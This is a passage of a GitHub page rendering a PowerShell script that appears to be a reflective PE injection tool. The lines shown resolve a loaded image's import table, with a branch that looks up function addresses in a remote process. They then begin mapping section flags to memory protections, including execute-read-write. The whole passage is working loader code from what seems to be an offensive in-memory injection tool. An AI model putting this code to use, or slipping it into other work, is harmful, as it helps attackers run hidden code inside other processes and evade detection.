          <td id="LC1827" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1828" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1828"></td>
          <td id="LC1828" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1829" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1829"></td>
          <td id="LC1829" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">-eq</span> <span class="pl-c1">$null</span>) <span class="pl-k">-or</span> (<span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero))</td>
        </tr>
        <tr>
          <td id="L1830" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1830"></td>
          <td id="LC1830" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1831" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1831"></td>
          <td id="LC1831" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Error importing DLL, DLLName: <span class="pl-smi">$ImportDllPath</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1832" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1832"></td>
          <td id="LC1832" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1833" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1833"></td>
          <td id="LC1833" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L1834" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1834"></td>
          <td id="LC1834" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>Get the first thunk, then loop through all of them</span></td>
        </tr>
        <tr>
          <td id="L1835" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1835"></td>
          <td id="LC1835" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ThunkRef</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$ImportDescriptor<span class="pl-smi">.FirstThunk</span></span>)</td>
        </tr>
        <tr>
          <td id="L1836" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1836"></td>
          <td id="LC1836" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$OriginalThunkRef</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$ImportDescriptor<span class="pl-smi">.Characteristics</span></span>) <span class="pl-c"><span class="pl-c">#</span>Characteristics is overloaded with OriginalFirstThunk</span></td>
        </tr>
        <tr>
          <td id="L1837" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1837"></td>
          <td id="LC1837" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$OriginalThunkRefVal</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$OriginalThunkRef</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L1838" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1838"></td>
          <td id="LC1838" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L1839" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1839"></td>
          <td id="LC1839" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">while</span> (<span class="pl-smi">$OriginalThunkRefVal</span> <span class="pl-k">-ne</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1840" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1840"></td>
          <td id="LC1840" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1841" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1841"></td>
          <td id="LC1841" class="blob-code blob-code-inner js-file-line">                    <span class="pl-smi">$LoadByOrdinal</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L1842" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1842"></td>
          <td id="LC1842" class="blob-code blob-code-inner js-file-line">                    [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ProcedureNamePtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1843" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1843"></td>
          <td id="LC1843" class="blob-code blob-code-inner js-file-line">					<span class="pl-c"><span class="pl-c">#</span>Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit</span></td>
        </tr>
        <tr>
          <td id="L1844" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1844"></td>
          <td id="LC1844" class="blob-code blob-code-inner js-file-line">					<span class="pl-c"><span class="pl-c">#</span>	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint</span></td>
        </tr>
        <tr>
          <td id="L1845" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1845"></td>
          <td id="LC1845" class="blob-code blob-code-inner js-file-line">					<span class="pl-c"><span class="pl-c">#</span>	and doing the comparison, just see if it is less than 0</span></td>
        </tr>
        <tr>
          <td id="L1846" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1846"></td>
          <td id="LC1846" class="blob-code blob-code-inner js-file-line">					[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$NewThunkRef</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1847" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1847"></td>
          <td id="LC1847" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">if</span>([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>]) <span class="pl-k">-eq</span> <span class="pl-c1">4</span> <span class="pl-k">-and</span> [<span class="pl-k">Int32</span>]<span class="pl-smi">$OriginalThunkRefVal</span> <span class="pl-k">-lt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1848" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1848"></td>
          <td id="LC1848" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1849" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1849"></td>
          <td id="LC1849" class="blob-code blob-code-inner js-file-line">						[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ProcedureNamePtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$OriginalThunkRefVal</span> <span class="pl-k">-band</span> <span class="pl-c1">0xffff</span> <span class="pl-c"><span class="pl-c">#</span>This is actually a lookup by ordinal</span></td>
        </tr>
        <tr>
          <td id="L1850" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1850"></td>
          <td id="LC1850" class="blob-code blob-code-inner js-file-line">                        <span class="pl-smi">$LoadByOrdinal</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L1851" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1851"></td>
          <td id="LC1851" class="blob-code blob-code-inner js-file-line">					}</td>
        </tr>
        <tr>
          <td id="L1852" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1852"></td>
          <td id="LC1852" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">elseif</span>([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>]) <span class="pl-k">-eq</span> <span class="pl-c1">8</span> <span class="pl-k">-and</span> [<span class="pl-k">Int64</span>]<span class="pl-smi">$OriginalThunkRefVal</span> <span class="pl-k">-lt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1853" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1853"></td>
          <td id="LC1853" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1854" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1854"></td>
          <td id="LC1854" class="blob-code blob-code-inner js-file-line">						[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ProcedureNamePtr</span> <span class="pl-k">=</span> [<span class="pl-k">Int64</span>]<span class="pl-smi">$OriginalThunkRefVal</span> <span class="pl-k">-band</span> <span class="pl-c1">0xffff</span> <span class="pl-c"><span class="pl-c">#</span>This is actually a lookup by ordinal</span></td>
        </tr>
        <tr>
          <td id="L1855" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1855"></td>
          <td id="LC1855" class="blob-code blob-code-inner js-file-line">                        <span class="pl-smi">$LoadByOrdinal</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L1856" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1856"></td>
          <td id="LC1856" class="blob-code blob-code-inner js-file-line">					}</td>
        </tr>
        <tr>
          <td id="L1857" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1857"></td>
          <td id="LC1857" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1858" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1858"></td>
          <td id="LC1858" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1859" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1859"></td>
          <td id="LC1859" class="blob-code blob-code-inner js-file-line">						[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$StringAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$OriginalThunkRefVal</span>)</td>
        </tr>
        <tr>
          <td id="L1860" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1860"></td>
          <td id="LC1860" class="blob-code blob-code-inner js-file-line">						<span class="pl-smi">$StringAddr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$StringAddr</span> ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">UInt16</span>]))</td>
        </tr>
        <tr>
          <td id="L1861" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1861"></td>
          <td id="LC1861" class="blob-code blob-code-inner js-file-line">						<span class="pl-smi">$ProcedureName</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAnsi(<span class="pl-smi">$StringAddr</span>)</td>
        </tr>
        <tr>
          <td id="L1862" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1862"></td>
          <td id="LC1862" class="blob-code blob-code-inner js-file-line">                        <span class="pl-smi">$ProcedureNamePtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StringToHGlobalAnsi(<span class="pl-smi">$ProcedureName</span>)</td>
        </tr>
        <tr>
          <td id="L1863" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1863"></td>
          <td id="LC1863" class="blob-code blob-code-inner js-file-line">					}</td>
        </tr>
        <tr>
          <td id="L1864" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1864"></td>
          <td id="LC1864" class="blob-code blob-code-inner js-file-line">					</td>
        </tr>
        <tr>
          <td id="L1865" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1865"></td>
          <td id="LC1865" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1866" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1866"></td>
          <td id="LC1866" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1867" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1867"></td>
          <td id="LC1867" class="blob-code blob-code-inner js-file-line">						[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$NewThunkRef</span> <span class="pl-k">=</span> <span class="pl-c1">Get-RemoteProcAddress</span> <span class="pl-k">-</span>RemoteProcHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>RemoteDllHandle <span class="pl-smi">$ImportDllHandle</span> <span class="pl-k">-</span>FunctionNamePtr <span class="pl-smi">$ProcedureNamePtr</span> <span class="pl-k">-</span>LoadByOrdinal <span class="pl-smi">$LoadByOrdinal</span></td>
        </tr>
        <tr>
          <td id="L1868" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1868"></td>
          <td id="LC1868" class="blob-code blob-code-inner js-file-line">					}</td>
        </tr>
        <tr>
          <td id="L1869" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1869"></td>
          <td id="LC1869" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1870" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1870"></td>
          <td id="LC1870" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1871" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1871"></td>
          <td id="LC1871" class="blob-code blob-code-inner js-file-line">				        [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$NewThunkRef</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddressIntPtr.Invoke</span></span>(<span class="pl-smi">$ImportDllHandle</span><span class="pl-k">,</span> <span class="pl-smi">$ProcedureNamePtr</span>)</td>
        </tr>
        <tr>
          <td id="L1872" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1872"></td>
          <td id="LC1872" class="blob-code blob-code-inner js-file-line">					}</td>
        </tr>
        <tr>
          <td id="L1873" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1873"></td>
          <td id="LC1873" class="blob-code blob-code-inner js-file-line">					</td>
        </tr>
        <tr>
          <td id="L1874" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1874"></td>
          <td id="LC1874" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">if</span> (<span class="pl-smi">$NewThunkRef</span> <span class="pl-k">-eq</span> <span class="pl-c1">$null</span> <span class="pl-k">-or</span> <span class="pl-smi">$NewThunkRef</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1875" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1875"></td>
          <td id="LC1875" class="blob-code blob-code-inner js-file-line">					{</td>
        </tr>
        <tr>
          <td id="L1876" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1876"></td>
          <td id="LC1876" class="blob-code blob-code-inner js-file-line">                        <span class="pl-k">if</span> (<span class="pl-smi">$LoadByOrdinal</span>)</td>
        </tr>
        <tr>
          <td id="L1877" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1877"></td>
          <td id="LC1877" class="blob-code blob-code-inner js-file-line">                        {</td>
        </tr>
        <tr>
          <td id="L1878" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1878"></td>
          <td id="LC1878" class="blob-code blob-code-inner js-file-line">                            <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>New function reference is null, this is almost certainly a bug in this script. Function Ordinal: <span class="pl-smi">$ProcedureNamePtr</span>. Dll: <span class="pl-smi">$ImportDllPath</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1879" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1879"></td>
          <td id="LC1879" class="blob-code blob-code-inner js-file-line">                        }</td>
        </tr>
        <tr>
          <td id="L1880" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1880"></td>
          <td id="LC1880" class="blob-code blob-code-inner js-file-line">                        <span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1881" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1881"></td>
          <td id="LC1881" class="blob-code blob-code-inner js-file-line">                        {</td>
        </tr>
        <tr>
          <td id="L1882" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1882"></td>
          <td id="LC1882" class="blob-code blob-code-inner js-file-line">						    <span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>New function reference is null, this is almost certainly a bug in this script. Function: <span class="pl-smi">$ProcedureName</span>. Dll: <span class="pl-smi">$ImportDllPath</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1883" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1883"></td>
          <td id="LC1883" class="blob-code blob-code-inner js-file-line">                        }</td>
        </tr>
        <tr>
          <td id="L1884" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1884"></td>
          <td id="LC1884" class="blob-code blob-code-inner js-file-line">					}</td>
        </tr>
        <tr>
          <td id="L1885" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1885"></td>
          <td id="LC1885" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1886" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1886"></td>
          <td id="LC1886" class="blob-code blob-code-inner js-file-line">					[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$NewThunkRef</span><span class="pl-k">,</span> <span class="pl-smi">$ThunkRef</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1887" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1887"></td>
          <td id="LC1887" class="blob-code blob-code-inner js-file-line">					</td>
        </tr>
        <tr>
          <td id="L1888" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1888"></td>
          <td id="LC1888" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ThunkRef</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$ThunkRef</span>) ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>]))</td>
        </tr>
        <tr>
          <td id="L1889" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1889"></td>
          <td id="LC1889" class="blob-code blob-code-inner js-file-line">					[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$OriginalThunkRef</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$OriginalThunkRef</span>) ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>]))</td>
        </tr>
        <tr>
          <td id="L1890" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1890"></td>
          <td id="LC1890" class="blob-code blob-code-inner js-file-line">					[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$OriginalThunkRefVal</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$OriginalThunkRef</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L1891" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1891"></td>
          <td id="LC1891" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1892" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1892"></td>
          <td id="LC1892" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c"><span class="pl-c">#</span>Cleanup</span></td>
        </tr>
        <tr>
          <td id="L1893" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1893"></td>
          <td id="LC1893" class="blob-code blob-code-inner js-file-line">                    <span class="pl-c"><span class="pl-c">#</span>If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed</span></td>
        </tr>
        <tr>
          <td id="L1894" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1894"></td>
          <td id="LC1894" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">if</span> ((<span class="pl-k">-not</span> <span class="pl-smi">$LoadByOrdinal</span>) <span class="pl-k">-and</span> (<span class="pl-smi">$ProcedureNamePtr</span> <span class="pl-k">-ne</span> [<span class="pl-k">IntPtr</span>]::Zero))</td>
        </tr>
        <tr>
          <td id="L1895" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1895"></td>
          <td id="LC1895" class="blob-code blob-code-inner js-file-line">                    {</td>
        </tr>
        <tr>
          <td id="L1896" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1896"></td>
          <td id="LC1896" class="blob-code blob-code-inner js-file-line">                        [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::FreeHGlobal(<span class="pl-smi">$ProcedureNamePtr</span>)</td>
        </tr>
        <tr>
          <td id="L1897" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1897"></td>
          <td id="LC1897" class="blob-code blob-code-inner js-file-line">                        <span class="pl-smi">$ProcedureNamePtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1898" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1898"></td>
          <td id="LC1898" class="blob-code blob-code-inner js-file-line">                    }</td>
        </tr>
        <tr>
          <td id="L1899" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1899"></td>
          <td id="LC1899" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1900" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1900"></td>
          <td id="LC1900" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L1901" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1901"></td>
          <td id="LC1901" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ImportDescriptorPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$ImportDescriptorPtr</span>) ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_IMPORT_DESCRIPTOR</span></span>))</td>
        </tr>
        <tr>
          <td id="L1902" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1902"></td>
          <td id="LC1902" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1903" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1903"></td>
          <td id="LC1903" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1904" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1904"></td>
          <td id="LC1904" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1905" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1905"></td>
          <td id="LC1905" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1906" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1906"></td>
          <td id="LC1906" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-VirtualProtectValue</span></td>
        </tr>
        <tr>
          <td id="L1907" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1907"></td>
          <td id="LC1907" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1908" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1908"></td>
          <td id="LC1908" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1909" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1909"></td>
          <td id="LC1909" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1910" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1910"></td>
          <td id="LC1910" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]</td>
        </tr>
        <tr>
          <td id="L1911" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1911"></td>
          <td id="LC1911" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SectionCharacteristics</span></td>
        </tr>
        <tr>
          <td id="L1912" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1912"></td>
          <td id="LC1912" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1913" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1913"></td>
          <td id="LC1913" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1914" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1914"></td>
          <td id="LC1914" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-c1">0x0</span></td>
        </tr>
        <tr>
          <td id="L1915" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1915"></td>
          <td id="LC1915" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_EXECUTE</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1916" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1916"></td>
          <td id="LC1916" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1917" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1917"></td>
          <td id="LC1917" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_READ</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1918" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1918"></td>
          <td id="LC1918" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1919" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1919"></td>
          <td id="LC1919" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_WRITE</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1920" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1920"></td>
          <td id="LC1920" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1921" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1921"></td>
          <td id="LC1921" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span></td>
        </tr>
        <tr>
          <td id="L1922" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1922"></td>
          <td id="LC1922" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1923" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1923"></td>
